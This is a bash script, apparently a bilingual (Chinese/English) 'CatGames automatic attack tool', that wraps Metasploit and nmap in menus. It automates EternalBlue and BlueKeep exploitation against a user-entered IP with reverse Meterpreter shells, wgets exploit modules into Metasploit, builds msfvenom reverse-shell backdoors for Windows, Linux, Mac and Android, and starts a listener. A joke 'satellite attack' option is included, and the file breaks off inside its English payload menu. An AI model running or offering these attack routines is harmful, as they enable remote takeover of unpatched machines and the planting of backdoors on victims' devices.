#!/bin/bash
CatGames_Chinese(){
: '
                                         ,s555SB@@&
                                     :9H####@@@@@Xi
                                     1@@@@@@@@@@@@@@8
                                   ,8@@@@@@@@@B@@@@@@8
                                  :B@@@@X3hi8Bs;B@@@@@Ah,
             ,8i                  r@@@B:     1S ,M@@@@@@#8;
            1AB35.i:               X@@8 .   SGhr ,A@@@@@@@@S
            1@h31MX8                18Hhh3i .i3r ,A@@@@@@@@@5
            ;@&i,58r5                 rGSS:     :B@@@@@@@@@@A
             1#i  . 9i                 hX.  .: .5@@@@@@@@@@@1
              sG1,  ,G53s.              9#Xi;hS5 3B@@@@@@@B1
               .h8h.,A@@@MXSs,           #@H1:    3ssSSX@1
               s ,@@@@@@@@@@@@Xhi,       r#@@X1s9M8    .GA981
               ,. rS8H#@@@@@@@@@@#HG51;.  .h31i;9@r    .8@@@@BS;i;
                .19AXXXAB@@@@@@@@@@@@@@#MHXG893hrX#XGGXM@@@@@@@@@@MS
                s@@MM@@@hsX#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&,
              :GB@#3G@@Brs ,1GM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B,
            .hM@@@#@@#MX 51  r;iSGAM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8
          :3B@@@@@@@@@@@&9@h :Gs   .;sSXH@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
      s&HA#@@@@@@@@@@@@@@M89A;.8S.       ,r3@@@@@@@@@@@@@@@@@@@@@@@@@@@r
    ,13B@@@@@@@@@@@@@@@@@@@5 5B3 ;.         ;@@@@@@@@@@@@@@@@@@@@@@@@@@@i
  5#@@#&@@@@@@@@@@@@@@@@@@9  .39:          ;@@@@@@@@@@@@@@@@@@@@@@@@@@@;
  9@@@X:MM@@@@@@@@@@@@@@@#;    ;31.         H@@@@@@@@@@@@@@@@@@@@@@@@@@:
   SH#@B9.rM@@@@@@@@@@@@@B       :.         3@@@@@@@@@@@@@@@@@@@@@@@@@@5
     ,:.   9@@@@@@@@@@@#HB5                 .M@@@@@@@@@@@@@@@@@@@@@@@@@B
           ,ssirhSM@&1;i19911i,.             s@@@@@@@@@@@@@@@@@@@@@@@@@@S
              ,,,rHAri1h1rh&@#353Sh:          8@@@@@@@@@@@@@@@@@@@@@@@@@#:
            .A3hH@#5S553&@@#h   i:i9S          #@@@@@@@@@@@@@@@@@@@@@@@@@A.
            又来看代码了！
            '

Initialization_Tools(){
  echo -e "\033]0;CatGames Auto Attack EXP\007"
	clear
	echo -e "\033[32mCatGames自动攻击工具初始化中......"
	b=''
	for ((i=0;$i<=100;i+=2))
	do
        printf "Loading:[%-50s]%d%%\r" $b $i
        sleep 0.1
        b=#$b
	done
	echo
	clear

}
CatGames_LoGo(){
	echo -e " _____       ___   _____   _____       ___       ___  ___   _____   _____
/  ___|     /   | |_   _| /  ___|     /   |     /   |/   | | ____| /  ___/
| |        / /| |   | |   | |        / /| |    / /|   /| | | |__   | |___
| |       / / | |   | |   | |  _    / / | |   / / |__/ | | |  __|  \___
| |___   / /  | |   | |   | |_| |  / /  | |  / /       | | | |___   ___| |
\_____| /_/   |_|   |_|   \_____/ /_/   |_| /_/        |_| |_____| /_____/
        "
echo -e "By_CatGamesGa0       CatGames.cn Email：GaoCatGames@mail.sdu.edu.cn"
echo -e "My Blog:Blog.CatGames.cn"
time3=$(date "+%Y-%m-%d %H:%M:%S")
echo "当前时间：$time3"
}
CatGames_CaoNiMa(){
	echo -e "
       ┏┓　 ┏┓
      ┏┛┻━━━┛┻┓
      ┃　　　 ┃ 　
      ┃　 ━   ┃
      ┃┳┛　┗┳ ┃
      ┃　　　 ┃
      ┃　┻　　┃
      ┃　　 　┃
      ┗━┓　 ┏━┛
        ┃　 ┃
        ┃　 ┃
        ┃　 ┗━━━┓
        ┃　   　┣┓
        ┃　　　┏┛
        ┗┓┓┏━┳┓┏┛
         ┃┫┫　┃┫┫
         ┗┻┛　┗┻┛
"
echo -e "\n"
}
CatGames_China_No-1(){
		echo -e " \e[32m_____   _   _   _   __   _       ___        __   _   _____        ___
\e[31m/  ___| | | | | | | |  \ | |     /   |      |  \ | | /  _  \      |_  |
\e[31m| |     | |_| | | | |   \| |    / /| |      |   \| | | | | |        | |
\e[31m| |     |  _  | | | | |\   |   / / | |      | |\   | | | | |        | |
\e[31m| |___  | | | | | | | | \  |  / /  | |      | | \  | | |_| |        | |
\e[31m\_____| |_| |_| |_| |_|  \_| /_/   |_|      |_|  \_| \_____/        |_|
        "
}
eternalblue_AuToExP(){
echo -e "\E[1;32m:::::::::::::: \e[97mMsf自动执行攻击脚本 \E[1;32m:::::::::::::::"
echo -e "\E[1;32m:::::::::::::: \e[97m攻防无绝对|技术无黑白 \E[1;32m:::::::::::::::"
CatGames_CaoNiMa
echo -e "\E[1;32m:::::::::::::: \e[97m自动执行永恒之蓝攻击 \E[1;32m:::::::::::::::"
#需要用户输入需要攻击的IP地址
read -p "请输入对方IP地址：" IPAdd;
read -p "请输入本机IP地址：" IPme;
#设置Eternalblue攻击模块
#设置Payload 反弹Meterpreter
#设置RHOSTS 为Hacker（JB小子）输入的攻击IP地址  445
#设置LHOST 反弹地址（本机地址）反弹端口设置为4444
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;
set payload windows/x64/meterpreter/reverse_tcp;
set RHOST $IPAdd;set RPORT 445;
set LHOST $IPme;set LPORT 4444;run"

}
eternalblue_AuTo_Auxiliary(){
	echo -e "\E[1;32m:::::::::::::: \e[97mMsf自动执行攻击脚本 \E[1;32m:::::::::::::::"
	echo -e "\E[1;32m:::::::::::::: \e[97m攻防无绝对|技术无黑白 \E[1;32m:::::::::::::::"
	CatGames_LoGo
	echo -e "\E[1;32m:::::::::::::: \e[97m自动执行永恒之蓝漏洞扫描 \E[1;32m:::::::::::::::"
	#设置需要扫描的IP地址范围是多少 传给$IPALL
	read -p "请输入需要扫描的IP地址范围：" IPALL;
	read -p "请输入需要设置的扫描线程（默认1）：" thread;
	#设置永恒之蓝扫描模块
	##设置RHOSTS $IPALL接受用户输入值 设置端口为445
	msfconsole -x "use auxiliary/scanner/smb/smb_ms17_010;
	set RHOSTS $IPALL;set RPORT 445;set threads $thread;run;"
}
Nmap_Scan(){
	clear
	CatGames_LoGo
	echo -e "[1]获取远程主机的系统类型及开放端口"
	echo -e "[2]在网络寻找所有在线主机"
	echo -e "[3]Ping 指定范围内的 IP 地址"
	echo -e "[4]获取主机系统类型"
	echo -e "[5]指定端口扫描"
	echo -e ""
	read -p "请输入您需要执行的功能(回车退出,0返回主菜单）：" Nmap
	case $Nmap in "1" | "1" )
	clear
	CatGames_LoGo
	read -p "请输入需要扫描的IP地址：" Nmap_IP
	nmap -sS -P0 -sV -O $Nmap_IP
		;;
	"2" | "2" )
	clear
	CatGames_LoGo
	read -p "请输入需要寻在在线主机的IP段(例:192.168.0.0/24)：" Nmap_IIP
	nmap -sP $Nmap_IIP
	;;
	"3" | "3" )
	clear
	CatGames_LoGo
	read -p "请输入你需要指定Ping的IP地址范围(例:192.168.1.100-254)：" Nmap_IIIP
	nmap -sP $Nmap_IIIP
	;;
	"4" | "4" )
	clear
	CatGames_LoGo
	read -p "请输入需要获取主机类型的IP地址：" Nmap_IIIIP
	nmap -O $Nmap_IIIIP
	;;
	"5" | "5" )
	clear
	CatGames_LoGo
	read -p "请输入端口号：" Nmap_PORT
	read -p "请输入IP地址：" Nmap_IIIIIP
	nmap -p $Nmap_PORT $Nmap_IIIIIP
	;;
  [6-10] | [6-10] )
  echo "[*]---------------------------"
  echo "您的输入错误"
  read -p "请输入回车返回"
  echo "[*]---------------------------"
  Nmap_Scan
  ;;
  [a-z] | [a-z] )
  echo "[*]---------------------------"
  echo "您的输入错误"
  read -p "请输入回车返回"
  echo "[*]---------------------------"
  Nmap_Scan
  ;;
  "" | "" )
  echo "[*]---------------------------"
  echo "您的输入错误"
  read -p "请输入回车返回"
  echo "[*]---------------------------"
  clear
  Nmap_Scan
  ;;
	"0" | "0" )
	clear
	CatGames_MenUI
	esac
	exit
}
Apache_Service(){
  service apache2 start
  echo -e "Apache Service Startup success"
  read -p "请输入0返回主菜单：" ApacheMenu
  case $ApacheMenu in "0" | "0" )
      clear
      CatGames_MenUI
      ;;
    [1-9] | [1-9] )
    echo "[*]---------------------------"
    echo "您的输入错误"
    read -p "请输入回车返回"
    echo "[*]---------------------------"
    clear
    CatGames_MenUI
    ;;
    "" | "" )
    echo "[*]---------------------------"
    echo "您的输入错误"
    read -p "请输入回车返回"
    echo "[*]---------------------------"
    clear
    CatGames_MenUI
    ;;
    [a-z] | [a-z] )
    echo "[*]---------------------------"
    echo "您的输入错误"
    read -p "请输入回车返回"
    echo "[*]---------------------------"
    clear
    CatGames_MenUI
    ;;
esac
}
Get_Payload(){
	clear
	CatGames_LoGo
	echo -e "[1]Windows"
	echo -e "[2]Linux"
	echo -e "[3]Mac"
	echo -e "[4]Android"
	read -p "选择Payload针对类型（0返回主菜单）:" Payload_1
	case $Payload_1 in "1" | "1" )
	read -p "请输入反弹IP：" MeIP
	read -p "请输入反弹端口：" Me_Port
	read -p "请输入Payload输出目录(例：tmp)：" Me_MuLu
	echo -e "Payload生成目录在/$Me_MuLu/CatGames_Payload.exe"
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MeIP LPORT=$Me_Port -f exe > /$Me_MuLu/CatGames_Payload.exe
	;;
	"2" | "2" )
	read -p "请输入反弹IP：" MeIP
	read -p "请输入反弹端口：" Me_Port
	read -p "请输入Payload输出目录(例：tmp)：" Me_MuLu
	echo -e "Payload生成目录在/$Me_MuLu/CatGames_Payload.elf"
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$MeIP LPORT=$Me_Port -f elf > /$Me_MuLu/CatGames_Payload.elf
	;;
	"3" | "3" )
	read -p "请输入反弹IP：" MeIP
	read -p "请输入反弹端口：" Me_Port
	read -p "请输入Payload输出目录(例：tmp)：" Me_MuLu
	echo -e "Payload生成目录在/$Me_MuLu/CatGames_Payload.macho"
	msfvenom -p osx/x86ell_reverse_tcp LHOST=$MeIP LPORT=$Me_Port -f macho > /$Me_MuLu/CatGames_Payload.macho
	;;
	"4" | "4" )
	echo -e "text"
	read -p "请输入反弹IP：" MeIP
	read -p "请输入反弹端口：" Me_Port
	read -p "请输入Payload输出目录(例：tmp)：" Me_MuLu
	echo -e "Payload生成目录在/$Me_MuLu/CatGames_Payload.apk"
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$MeIP LPORT=$Me_Port R > /$Me_MuLu/CatGames_Payload.apk
	;;
  [a-z] | [a-z] )
  echo "[*]---------------------------"
  echo "您的输入错误"
  read -p "请输入回车返回"
  echo "[*]---------------------------"
  clear
  Get_Payload
  ;;
  [5-9] | [5-9] )
  echo "[*]---------------------------"
  echo "您的输入错误"
  read -p "请输入回车返回"
  echo "[*]---------------------------"
  clear
  Get_Payload
  ;;
  "" | "" )
  echo "[*]---------------------------"
  echo "您的输入错误"
  read -p "请输入回车返回"
  echo "[*]---------------------------"
  clear
  Get_Payload
  ;;
	"0" | "0" )
	clear
	CatGames_MenUI
	esac
	exit
}

CatGames_satellite(){
	read -p "请输入需要攻击哪个国家的卫星（目前支持美国）:" satellite;
	echo -e "您选择的是[$satellite]的卫星 "
	read -p "请选择攻击成功后卫星掉落地点:" place;
	echo -e "您选择的卫星坠落地点是[$place]"
	int=1
	while(( $int<=5 ))
	do
    echo -e "请等待$int秒"
    echo -e "攻击反馈：已突破防火墙，已执行溢出，EXP攻击成功！"
    let "int++"
	done
	echo -e "攻击成功，美国一颗卫星已经坠落在$place,做得好hACKER(JB小子）"
	CatGames_China_No-1
	echo -e "\n"
	echo -e ""
	read -p "【回车】返回主菜单"
	clear
	CatGames_MenUI
}
CatGames_Get_Poc(){
	git clone https://github.com/zerosum0x0/CVE-2019-0708.git
	cd CVE-2019-0708/rdesktop-fork-bd6aa6acddf0ba640a49834807872f4cc0d0a773/
	apt-get install dh-autoreconf
	apt-get install libssl-dev
	./bootstrap
	./configure --disable-credssp --disable-smartcard
	make
	read -p "请输入对方IP以及端口（3389）：" IPPOC;
	./rdesktop $IPPOC
}
CatGames_Monitor(){
	clear
	CatGames_LoGo
	read -p "请输入监听IP：" JTIP
	read -p "请输入监听端口：" JTPROT
	msfconsole -x "use exploit/multi/handler;
	set PAYLOAD windows/meterpreter/reverse_tcp;
	set LHOST $JTIP;set PROT $JTPROT;run;"
}
CatGames_CVE2019-0708_Download(){
	CatGames_LoGo
	mkdir /usr/share/metasploit-framework/modules/exploits/windows/rdp
	chmod -x /usr/share/metasploit-framework/modules/exploits/windows/rdp
	wget -P /root https://Blog.CatGAmes.cn/CVE2019-0708/rdp.rb
	cp /root/rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/
	wget -P /root https://Blog.CatGAmes.cn/CVE2019-0708/rdp_scanner.rb
	cp /root/rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/
	wget -P /root https://Blog.CatGAmes.cn/CVE2019-0708/cve_2019_0708_bluekeep_rce.rb
	cp /root/cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/
	wget -P /root https://Blog.CatGAmes.cn/CVE2019-0708/cve_2019_0708_bluekeep.rb
	cp /root/cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/
	echo "rdp.rb,rdp_scanner.rb,cve_2019_0708_bluekeep_rce.rb,cve_2019_0708_bluekeep.rb 下载成功 并已拷贝到指定目录"
	msfconsole -x "reload_all;exit"
	echo -e "已重新加载所有模块 ：） 祝您好运"
	echo -e "===================================================================="
	CatGames_MenUI
}
CatGames_CVE2019-0708(){
	clear
	CatGames_LoGo
	echo -e "请选择您需要使用的模块"
	echo -e "【1】cve_2019_0708_辅助模块"
	echo -e "【2】cve_2019_0708_漏洞模块"
	read -p "请输入您的选择【按0退回主菜单】：" CVE
	case $CVE in "1" | "1" )
	clear
	CatGames_LoGo
	read -p "请输入扫描IP或IP段：" CVE_2019_IP
	read -p "请输入扫描线程数：" CVE_2019_thread
	msfconsole -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;set RHOSTS $CVE_2019_IP;set threads $CVE_2019_thread;exploit"
	;;
	 "2" | "2" )
	clear
	CatGames_LoGo
	read -p "请输入被攻击IP：" CVE_2019_IP_EXP
	echo -e "请选择target"
	echo -e "【0】自动指纹识别系统版本"
	echo -e "【1】Windows 7 SP1 / 2008 R2 (6.1.7601 x64)"
	echo -e "【2】Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox)"
	echo -e "【3】Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)"
	echo -e "【4】Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)"
	read -p "请输入（0-4）：" CVE_2019_EXP_TarGet
	echo -e "请仔细检查您输入的信息"
	echo -e "您输入的被攻击IP是：$CVE_2019_IP_EXP"
	echo -e "您输入的target是：$CVE_2019_EXP_TarGet"
	msfconsole -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce;set RHOSTS $CVE_2019_IP_EXP;set target $CVE_2019_EXP_TarGet;exploit"
	;;
  [a-z] | [a-z] )
  echo "[*]---------------------------"
  echo "您的输入错误"
  read -p "请输入回车返回"
  echo "[*]---------------------------"
  clear
  CatGames_CVE2019-0708
  ;;
  "" | "" )
  echo "[*]---------------------------"
  echo "您的输入错误"
  read -p "请输入回车返回"
  echo "[*]---------------------------"
  clear
  CatGames_CVE2019-0708
  ;;
  [3-9] | [3-9] )
  echo "[*]---------------------------"
  echo "您的输入错误"
  read -p "请输入回车返回"
  echo "[*]---------------------------"
  clear
  CatGames_CVE2019-0708
  ;;
	"0" | "0" )
	claer
	echo -e "===================================================================="
	CatGames_MenUI
esac
	exit
}
CatGames_About(){
	clear
	echo -e "感谢Cimoom_曲云杰的指点"
	sleep 2
	echo -e "感谢WRS戏子的指点"
	sleep 2
	echo -e "\033[5;32m _____       ___   _____   _____       ___       ___  ___   _____   _____
/  ___|     /   | |_   _| /  ___|     /   |     /   |/   | | ____| /  ___/
| |        / /| |   | |   | |        / /| |    / /|   /| | | |__   | |___
| |       / / | |   | |   | |  _    / / | |   / / |__/ | | |  __|  \___
| |___   / /  | |   | |   | |_| |  / /  | |  / /       | | | |___   ___| |
\_____| /_/   |_|   |_|   \_____/ /_/   |_| /_/        |_| |_____| /_____/  \033[0m"
	echo -e "By_CatGamesGa0"
	echo -e "我的博客：Blog.CatGames.cn"
	echo -e "我的邮箱：GaoCatGames@mail.sdu.edu.cn"
	sleep 3
	clear
	CatGames_MenUI
}
CatGames_MenUI(){
echo -e "\E[1;32m:::::::::::::: \e[97mCatGamesGa0自动执行攻击脚本 \E[1;32m:::::::::::::::"
echo -e "\E[1;32m:::::::::::::: \e[97m攻防无绝对|技术无黑白 \E[1;32m:::::::::::::::"
CatGames_LoGo
echo -e "\033[32m======================="
echo -e "\033[32m|请输入需要使用的功能！"
echo -e "\033[32m|[1]永恒之蓝"
echo -e "\033[32m|[2]使用CVE-2019-0708-POC"
echo -e "\033[32m|[3]CVE-2019-0708-Download"
echo -e "\033[32m|[4]CVE-2019-0708-Exploit"
echo -e "\033[32m|[5]一键日卫星"
echo -e "\033[32m|[6]生成Payload"
echo -e "\033[32m|[7]Nmap扫描"
echo -e "\033[32m|[8]Msf监听IP与端口"
echo -e "\033[32m|[9]启动Apache服务"
echo -e "\033[32m|[10]关于"
echo -e "\033[32m|[0]帮助"
echo -e "\033[32m======================="
read -p "请输入您需要执行的功能(回车退出）：" Num
case $Num in "1" | "1" )
	clear
	CatGames_LoGo
	echo -e "\033[32m[1]使用永恒之蓝扫描模块"
	echo -e "\033[32m[2]使用永恒之蓝攻击模块"
	read -p "您选择扫描模块还是攻击模块(0返回上一层)：" mod
	case $mod in "1" | "1" )
		clear
		eternalblue_AuTo_Auxiliary
			;;
			"2" | "2" )
		clear
		eternalblue_AuToExP
			;;
	  [a-z] | [a-z] )
    echo "[*]---------------------------"
    echo "您的输入错误"
    read -p "请输入回车返回"
    echo "[*]---------------------------"
    clear
    CatGames_MenUI
    ;;
    "" | "" )
    echo "[*]---------------------------"
    echo "您的输入错误"
    read -p "请输入回车返回"
    echo "[*]---------------------------"
    clear
    CatGames_MenUI
    ;;
  	[3-9] | [3-9] )
    echo "[*]---------------------------"
    echo "您的输入错误"
    read -p "请输入回车返回"
    echo "[*]---------------------------"
    clear
    CatGames_MenUI
    ;;
		"0" | "0" )
		clear
		CatGames_MenUI
		;;
	esac
	;;
	"2" | "2" )
	CatGames_Get_Poc
	;;
	"3" | "3" )
	CatGames_CVE2019-0708_Download
	;;
	"4" | "4" )
	CatGames_CVE2019-0708
	;;
	"5" | "5" )
	CatGames_satellite
	;;
	"6" | "6" )
	Get_Payload
	;;
	"7" | "7" )
	Nmap_Scan
	;;
	"8" | "8" )
	CatGames_Monitor
	;;
	"9" | "9" )
	Apache_Service
	;;
  "10" | "10" )
  CatGames_About
  ;;
  "" | "" )
  echo "[*]---------------------------"
  echo "您的输入错误"
  read -p "请输入回车返回"
  echo "[*]---------------------------"
  clear
  CatGames_MenUI
  ;;
	[a-z] | [a-z] )
  echo "[*]---------------------------"
  echo "您的输入错误"
  read -p "请输入回车返回"
  echo "[*]---------------------------"
  clear
  CatGames_MenUI
  ;;
	"0" | "0" )
		echo -e "===================================================================="
	echo -e "此工具最好的使用环境是Kali linux，因为大部分功能都是按照kali linux的样子写的"
	echo -e "当然，你也可以选择在其他的环境使用（Ubuntu,或其他Linux）"
	echo -e "如果在非kali linux的系统上使用，并不保证所有功能会齐全"
	echo -e "考虑到国内下载kali linux如果没有梯子会特别的慢的情况下"
	echo -e "请复制到浏览器打开：https://pan.baidu.com/s/1ERx8huO66AOWKFPI_fKamw 提取码：w4zw"
	echo -e "如果还有什么问题，请到我的博客：Blog.CatGames.cn留言提问"
	echo -e "或发送邮件到GaoCatGames@mail.sdu.edu.cn"
	echo -e "回车返回主菜单"
	read -p ""
	clear
	CatGames_MenUI
esac
	exit
}
Initialization_Tools
echo -e "\E[1;32m<:::::::::::::: \e[97m自动攻击工具 \E[1;32m:::::::::::::::>"
echo -e "\E[1;32m<:::::::::::::: \e[97m攻防无绝对|技术无黑白 \E[1;32m:::::::::::::::>"
CatGames_LoGo
echo -e "\E[1;32m<:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::>"
echo -e "\E[1;32m<:::::::::::::: \e[97mMetasploit service started \E[1;32m:::::::::::::::::>"
echo -e "\E[1;32m<:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::>"
CatGames_CaoNiMa
read -p "初始化完成,按下【回车】开始！"
clear
CatGames_MenUI
}

CatGames_English(){
: '
                                         ,s555SB@@&
                                     :9H####@@@@@Xi
                                     1@@@@@@@@@@@@@@8
                                   ,8@@@@@@@@@B@@@@@@8
                                  :B@@@@X3hi8Bs;B@@@@@Ah,
             ,8i                  r@@@B:     1S ,M@@@@@@#8;
            1AB35.i:               X@@8 .   SGhr ,A@@@@@@@@S
            1@h31MX8                18Hhh3i .i3r ,A@@@@@@@@@5
            ;@&i,58r5                 rGSS:     :B@@@@@@@@@@A
             1#i  . 9i                 hX.  .: .5@@@@@@@@@@@1
              sG1,  ,G53s.              9#Xi;hS5 3B@@@@@@@B1
               .h8h.,A@@@MXSs,           #@H1:    3ssSSX@1
               s ,@@@@@@@@@@@@Xhi,       r#@@X1s9M8    .GA981
               ,. rS8H#@@@@@@@@@@#HG51;.  .h31i;9@r    .8@@@@BS;i;
                .19AXXXAB@@@@@@@@@@@@@@#MHXG893hrX#XGGXM@@@@@@@@@@MS
                s@@MM@@@hsX#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&,
              :GB@#3G@@Brs ,1GM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B,
            .hM@@@#@@#MX 51  r;iSGAM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8
          :3B@@@@@@@@@@@&9@h :Gs   .;sSXH@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
      s&HA#@@@@@@@@@@@@@@M89A;.8S.       ,r3@@@@@@@@@@@@@@@@@@@@@@@@@@@r
    ,13B@@@@@@@@@@@@@@@@@@@5 5B3 ;.         ;@@@@@@@@@@@@@@@@@@@@@@@@@@@i
  5#@@#&@@@@@@@@@@@@@@@@@@9  .39:          ;@@@@@@@@@@@@@@@@@@@@@@@@@@@;
  9@@@X:MM@@@@@@@@@@@@@@@#;    ;31.         H@@@@@@@@@@@@@@@@@@@@@@@@@@:
   SH#@B9.rM@@@@@@@@@@@@@B       :.         3@@@@@@@@@@@@@@@@@@@@@@@@@@5
     ,:.   9@@@@@@@@@@@#HB5                 .M@@@@@@@@@@@@@@@@@@@@@@@@@B
           ,ssirhSM@&1;i19911i,.             s@@@@@@@@@@@@@@@@@@@@@@@@@@S
              ,,,rHAri1h1rh&@#353Sh:          8@@@@@@@@@@@@@@@@@@@@@@@@@#:
            .A3hH@#5S553&@@#h   i:i9S          #@@@@@@@@@@@@@@@@@@@@@@@@@A.
            又来看代码了！
            '

Initialization_Tools(){
	clear
	echo -e "\033[32mCatGames Automatic Attack tool initializing......"
	b=''
	for ((i=0;$i<=100;i+=2))
	do
        printf "initializing:[%-50s]%d%%\r" $b $i
        sleep 0.1
        b=#$b
	done
	echo
	clear

}
CatGames_LoGo(){
	echo -e " _____       ___   _____   _____       ___       ___  ___   _____   _____
/  ___|     /   | |_   _| /  ___|     /   |     /   |/   | | ____| /  ___/
| |        / /| |   | |   | |        / /| |    / /|   /| | | |__   | |___
| |       / / | |   | |   | |  _    / / | |   / / |__/ | | |  __|  \___
| |___   / /  | |   | |   | |_| |  / /  | |  / /       | | | |___   ___| |
\_____| /_/   |_|   |_|   \_____/ /_/   |_| /_/        |_| |_____| /_____/
        "
echo -e "By_CatGamesGa0       CatGames.cn Email：GaoCatGames@mail.sdu.edu.cn"
echo -e "My Blog:Blog.CatGames.cn"
time3=$(date "+%Y-%m-%d %H:%M:%S")
echo "Current time：$time3"
}
CatGames_CaoNiMa(){
	echo -e "
       ┏┓　 ┏┓ 
      ┏┛┻━━━┛┻┓ 
      ┃　　　 ┃ 　 
      ┃　 ━   ┃ 
      ┃┳┛　┗┳ ┃ 
      ┃　　　 ┃ 
      ┃　┻　　┃ 
      ┃　　 　┃ 
      ┗━┓　 ┏━┛ 
        ┃　 ┃
        ┃　 ┃ 
        ┃　 ┗━━━┓ 
        ┃　   　┣┓ 
        ┃　　　┏┛ 
        ┗┓┓┏━┳┓┏┛ 
         ┃┫┫　┃┫┫ 
         ┗┻┛　┗┻┛
"
echo -e "\n"
}
CatGames_China_No-1(){
		echo -e " \e[32m_____   _   _   _   __   _       ___        __   _   _____        ___
\e[31m/  ___| | | | | | | |  \ | |     /   |      |  \ | | /  _  \      |_  |
\e[31m| |     | |_| | | | |   \| |    / /| |      |   \| | | | | |        | |
\e[31m| |     |  _  | | | | |\   |   / / | |      | |\   | | | | |        | |
\e[31m| |___  | | | | | | | | \  |  / /  | |      | | \  | | |_| |        | |
\e[31m\_____| |_| |_| |_| |_|  \_| /_/   |_|      |_|  \_| \_____/        |_|

        "
}
eternalblue_AuToExP(){
echo -e "\E[1;32m:::::::::::::: \e[97m Msf Automatic execution of Attack Script \E[1;32m:::::::::::::::"
echo -e "\E[1;32m:::::::::::::: \e[97m Attack and defense without absolute technology without black and white \E[1;32m:::::::::::::::"
CatGames_CaoNiMa
echo -e "\E[1;32m:::::::::::::: \e[97m Auto execute ms17_010_eternalblue \E[1;32m:::::::::::::::"
#需要用户输入需要攻击的IP地址
read -p "Please input Other Party IP：" IPAdd;
read -p "Please Your IP：" IPme;
#设置Eternalblue攻击模块
#设置Payload 反弹Meterpreter
#设置RHOSTS 为Hacker（JB小子）输入的攻击IP地址  445
#设置LHOST 反弹地址（本机地址）反弹端口设置为4444
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;
set payload windows/x64/meterpreter/reverse_tcp;
set RHOST $IPAdd;set RPORT 445;
set LHOST $IPme;set LPORT 4444;run"

}
eternalblue_AuTo_Auxiliary(){
	echo -e "\E[1;32m:::::::::::::: \e[97mMsf Automatic execution of attack script \E[1;32m:::::::::::::::"
	echo -e "\E[1;32m:::::::::::::: \e[97m Attack and defense without absolute technology without black and white \E[1;32m:::::::::::::::"
	CatGames_LoGo
	echo -e "\E[1;32m:::::::::::::: \e[97m Auto execute ms17_010_eternalblue Scan \E[1;32m:::::::::::::::"
	#设置需要扫描的IP地址范围是多少 传给$IPALL
	read -p "Please enter the IP address range to scan：" IPALL;
	read -p "Please enter the scanning thread to be set (default 1)：" thread;
	#设置永恒之蓝扫描模块
	##设置RHOSTS $IPALL接受用户输入值 设置端口为445
	msfconsole -x "use auxiliary/scanner/smb/smb_ms17_010;
	set RHOSTS $IPALL;set RPORT 445;set threads $thread;run;"
}
Nmap_Scan(){
	clear
	CatGames_LoGo
	echo -e "[1]Obtain the system type and open port of the remote host"
	echo -e "[2]Find all online hosts on the network"
	echo -e "[3]Ping IP address in the specified range"
	echo -e "[4]Get host system type"
	echo -e "[5]Specified port scan"
	echo -e ""
	read -p "Please enter the function you need to perform (enter to exit, 0 to return to the main menu)：" Nmap
	case $Nmap in "1" | "1" )
	clear
	CatGames_LoGo
	read -p "Please enter the IP address to be scanned：" Nmap_IP
	nmap -sS -P0 -sV -O $Nmap_IP
		;;
	"2" | "2" )
	clear
	CatGames_LoGo
	read -p "Please enter the IP segment to locate in the online host (example: 192.168.0.0 / 24):" Nmap_IIP
	nmap -sP $Nmap_IIP
	;;
	"3" | "3" )
	clear
	CatGames_LoGo
	read -p "Please enter the IP address range you need to specify for Ping (example: 192.168.1.100-254):" Nmap_IIIP
	nmap -sP $Nmap_IIIP
	;;
	"4" | "4" )
	clear
	CatGames_LoGo
	read -p "Please enter the IP address to obtain the host type：" Nmap_IIIIP
	nmap -O $Nmap_IIIIP
	;;
	"5" | "5" )
	clear
	CatGames_LoGo
	read -p "Please enter the port number：" Nmap_PORT
	read -p "Please enter IP address：" Nmap_IIIIIP
	nmap -p $Nmap_PORT $Nmap_IIIIIP
	;;
  [a-z] | [a-z] )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  Nmap_Scan
  ;;
  "" | "" )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  Nmap_Scan
  ;;
  [6-9] | [6-9] )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  Nmap_Scan
  ;;
	"0" | "0" )
	clear
	CatGames_MenUI
	esac
	exit

}
Get_Payload(){
	clear
	CatGames_LoGo
	echo -e "[1]Windows"
	echo -e "[2]Linux"
	echo -e "[3]Mac"
	echo -e "[4]Android"
	read -p "Please enter the number to select the type of back door:" Payload_1
	case $Payload_1 in "1" | "1" )
	read -p "Please enter bounce IP：" MeIP
	read -p "Please enter bounce port：" Me_Port
	read -p "Please enter the payload output directory (example: tmp)：" Me_MuLu
	echo -e "Backdoor Create in/$Me_MuLu/CatGames_Payload.exe"
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MeIP LPORT=$Me_Port -f exe > /$Me_MuLu/CatGames_Payload.exe
	;;
	"2" | "2" )
	read -p "Please enter bounce IP：" MeIP
	read -p "Please enter bounce port：" Me_Port
	read -p "Please enter the payload output directory (example: tmp)：" Me_MuLu
